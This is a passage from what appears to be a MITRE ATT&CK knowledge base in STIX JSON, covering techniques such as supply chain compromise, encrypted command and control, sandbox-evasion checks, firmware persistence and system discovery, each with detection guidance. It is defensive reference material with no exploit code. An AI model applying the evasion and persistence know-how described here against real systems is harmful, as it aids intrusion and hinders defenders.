2018.\",\"source_name\":\"Microsoft Dofoil 2018\",\"url\":\"https://cloudblogs.microsoft.com/microsoftsecure/2018/03/07/behavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign/\"},{\"description\":\"Command Five Pty Ltd. (2011, September). SK Hack by an Advanced Persistent Threat. Retrieved April 6, 2018.\",\"source_name\":\"Command Five SK 2011\",\"url\":\"https://www.commandfive.com/papers/C5_APT_SKHack.pdf\"},{\"description\":\"O\'Gorman, G., and McDonald, G.. (2012, September 6). The Elderwood Project. Retrieved February 15, 2018.\",\"source_name\":\"Symantec Elderwood Sept 2012\",\"url\":\"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf\"},{\"description\":\"Trendmicro. (2018, November 29). Hacker Infects Node.js Package to Steal from Bitcoin Wallets. Retrieved April 10, 2019.\",\"source_name\":\"Trendmicro NPM Compromise\",\"url\":\"https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets\"}],\"id\":\"attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-23T12:51:45.574Z\",\"name\":\"Supply Chain Compromise\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Veeral Patel\"],\"x_mitre_data_sources\":[\"Web proxy\",\"File monitoring\"],\"x_mitre_detection\":\"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2020-03-16T15:45:17.032Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.\",\"external_references\":[{\"external_id\":\"T1573.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1573/001\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T21:25:37.306Z\",\"name\":\"Symmetric Cryptography\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"Process monitoring\",\"Process use of network\",\"Malware reverse engineering\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\\n\\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-06T20:57:37.959Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nSpecific checks may will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \\n\\nChecks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \\n\\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \\n \\nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)\",\"external_references\":[{\"external_id\":\"T1497.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1497/001\"},{\"description\":\"Roccia, T. (2017, January 19). Stopping Malware With a Fake Virtual Machine. Retrieved April 17, 2019.\",\"source_name\":\"McAfee Virtual Jan 2017\",\"url\":\"https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/stopping-malware-fake-virtual-machine/\"},{\"description\":\"Falcone, R., et al. (2018, September 04). OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE. Retrieved September 24, 2018.\",\"source_name\":\"Unit 42 OilRig Sept 2018\",\"url\":\"https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/\"}],\"id\":\"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-07-01T16:32:02.514Z\",\"name\":\"System Checks\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Deloitte Threat Library Team\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Static File Analysis\",\"Signature-based detection\",\"Host forensic analysis\",\"Anti-virus\"],\"x_mitre_detection\":\"Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary\'s implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:28.613Z\",\"external_references\":[{\"external_id\":\"T1019\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1019\"},{\"external_id\":\"CAPEC-532\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/532.html\"},{\"description\":\"Wikipedia. (n.d.). BIOS. Retrieved January 5, 2016.\",\"source_name\":\"Wikipedia BIOS\",\"url\":\"https://en.wikipedia.org/wiki/BIOS\"},{\"description\":\"Wikipedia. (2017, July 10). Unified Extensible Firmware Interface. Retrieved July 11, 2017.\",\"source_name\":\"Wikipedia UEFI\",\"url\":\"https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface\"},{\"description\":\"UEFI Forum. (n.d.). About UEFI Forum. Retrieved January 5, 2016.\",\"source_name\":\"About UEFI\",\"url\":\"http://www.uefi.org/about\"},{\"description\":\"Upham, K. (2014, March). Going Deep into the BIOS with MITRE Firmware Security Research. Retrieved January 5, 2016.\",\"source_name\":\"MITRE Trustworthy Firmware Measurement\",\"url\":\"http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research\"},{\"description\":\"Butterworth, J. (2013, July 30). Copernicus: Question Your Assumptions about BIOS Security. Retrieved December 11, 2015.\",\"source_name\":\"MITRE Copernicus\",\"url\":\"http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about\"},{\"description\":\"Beek, C., Samani, R. (2017, March 8). CHIPSEC Support Against Vault 7 Disclosure Scanning. Retrieved March 13, 2017.\",\"source_name\":\"McAfee CHIPSEC Blog\",\"url\":\"https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/\"},{\"description\":\"Intel. (2017, March 18). CHIPSEC Platform Security Assessment Framework. Retrieved March 20, 2017.\",\"source_name\":\"Github CHIPSEC\",\"url\":\"https://github.com/chipsec/chipsec\"},{\"description\":\"Intel Security. (2005, July 16). HackingTeam\'s UEFI Rootkit Details. Retrieved March 20, 2017.\",\"source_name\":\"Intel HackingTeam UEFI Rootkit\",\"url\":\"http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html\"}],\"id\":\"attack-pattern--6856ddd6-2df3-4379-8b87-284603c189c3\",\"modified\":\"2020-03-30T19:16:29.473Z\",\"name\":\"System Firmware\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2019-12-19T19:43:34.507Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)\\n\\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.\",\"external_references\":[{\"external_id\":\"T1542.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1542/001\"},{\"external_id\":\"CAPEC-532\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/532.html\"},{\"description\":\"Wikipedia. (n.d.). BIOS. Retrieved January 5, 2016.\",\"source_name\":\"Wikipedia BIOS\",\"url\":\"https://en.wikipedia.org/wiki/BIOS\"},{\"description\":\"Wikipedia. (2017, July 10). Unified Extensible Firmware Interface. Retrieved July 11, 2017.\",\"source_name\":\"Wikipedia UEFI\",\"url\":\"https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface\"},{\"description\":\"UEFI Forum. (n.d.). About UEFI Forum. Retrieved January 5, 2016.\",\"source_name\":\"About UEFI\",\"url\":\"http://www.uefi.org/about\"},{\"description\":\"Upham, K. (2014, March). Going Deep into the BIOS with MITRE Firmware Security Research. Retrieved January 5, 2016.\",\"source_name\":\"MITRE Trustworthy Firmware Measurement\",\"url\":\"http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research\"},{\"description\":\"Butterworth, J. (2013, July 30). Copernicus: Question Your Assumptions about BIOS Security. Retrieved December 11, 2015.\",\"source_name\":\"MITRE Copernicus\",\"url\":\"http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about\"},{\"description\":\"Beek, C., Samani, R. (2017, March 8). CHIPSEC Support Against Vault 7 Disclosure Scanning. Retrieved March 13, 2017.\",\"source_name\":\"McAfee CHIPSEC Blog\",\"url\":\"https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/\"},{\"description\":\"Intel. (2017, March 18). CHIPSEC Platform Security Assessment Framework. Retrieved March 20, 2017.\",\"source_name\":\"Github CHIPSEC\",\"url\":\"https://github.com/chipsec/chipsec\"},{\"description\":\"Intel Security. (2005, July 16). HackingTeam\'s UEFI Rootkit Details. Retrieved March 20, 2017.\",\"source_name\":\"Intel HackingTeam UEFI Rootkit\",\"url\":\"http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html\"}],\"id\":\"attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-05-19T21:22:37.865Z\",\"name\":\"System Firmware\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Jean-Ian Boutin, ESET\",\"McAfee\",\"Ryan Becwar\"],\"x_mitre_data_sources\":[\"EFI\",\"BIOS\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Host intrusion prevention systems\",\"Anti-virus\",\"File monitoring\"],\"x_mitre_detection\":\"System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.\\n\\nLikewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:04.307Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\\n\\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\",\"external_references\":[{\"external_id\":\"T1082\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1082\"},{\"external_id\":\"CAPEC-312\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/312.html\"},{\"description\":\"Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.\",\"source_name\":\"Amazon Describe Instance\",\"url\":\"https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html\"},{\"description\":\"Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020.\",\"source_name\":\"Google Instances Resource\",\"url\":\"https://cloud.google.com/compute/docs/reference/rest/v1/instances\"},{\"description\":\"Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.\",\"source_name\":\"Microsoft Virutal Machine API\",\"url\":\"https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get\"}],\"id\":\"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T18:17:42.298Z\",\"name\":\"System Information Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"Stackdriver logs\",\"AWS CloudTrail logs\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2017-05-31T21:30:27.342Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\\n\\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\",\"external_references\":[{\"external_id\":\"T1016\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1016\"},{\"external_id\":\"CAPEC-309\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/309.html\"}],\"id\":\"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-15T00:55:33.136Z\",\"name\":\"System Network Configuration Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2017-05-31T21:30:45.139Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \\n\\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary\'s goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)\\n\\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \\\"net use,\\\" and \\\"net session\\\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \\\"net session\\\".\",\"external_references\":[{\"external_id\":\"T1049\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1049\"},{\"description\":\"Amazon. (n.d.). What Is Amazon VPC?. Retrieved October 6, 2019.\",\"source_name\":\"Amazon AWS VPC Guide\",\"url\":\"https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html\"},{\"description\":\"Annamalai, N., Casey, C., Almeida, M., et. al.. (2019, June 18). What is Azure Virtual Network?. Retrieved October 6, 2019.\",\"source_name\":\"Microsoft Azure Virtual Network Overview\",\"url\":\"https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-overview\"},{\"description\":\"Google. (2019, September 23). Virtual Private Cloud (VPC) network overview. Retrieved October 6, 2019.\",\"source_name\":\"Google VPC Overview\",\"url\":\"https://cloud.google.com/vpc/docs/vpc\"}],\"id\":\"attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-15T14:15:32.910Z\",\"name\":\"System Network Connections Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2017-05-31T21:30:35.733Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.\",\"external_references\":[{\"external_id\":\"T1033\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1033\"},{\"external_id\":\"CAPEC-577\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/577.html\"}],\"id\":\"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-15T01:03:47.866Z\",\"name\":\"System Owner/User Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2017-05-31T21:30:21.315Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \\\"sc,\\\" \\\"tasklist /svc\\\" using [Tasklist](https://attack.mitre.org/software/S0057), and \\\"net start\\\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\",\"external_references\":[{\"external_id\":\"T1007\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1007\"},{\"external_id\":\"CAPEC-574\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/574.html\"}],\"id\":\"attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-15T01:05:08.805Z\",\"name\":\"System Service Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-03-10T18:23:06.482Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.\",\"external_references\":[{\"external_id\":\"T1569\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1569\"}],\"id\":\"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-06-08T23:28:29.250Z\",\"name\":\"System Services\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor for command line invocations of tools capable of modifying services that doesn’t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-10-04T20:42:28.541Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer.(Citation: Microsoft Shutdown Oct 2017) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\\n\\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)\",\"external_references\":[{\"external_id\":\"T1529\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1529\"},{\"description\":\"Microsoft. (2017, October 15). Shutdown. Retrieved October 4, 2019.\",\"source_name\":\"Microsoft Shutdown Oct 2017\",\"url\":\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown\"},{\"description\":\"Chiu, A. (2016, June 27). New Ransomware Variant \\\"Nyetya\\\" Compromises Systems Worldwide. 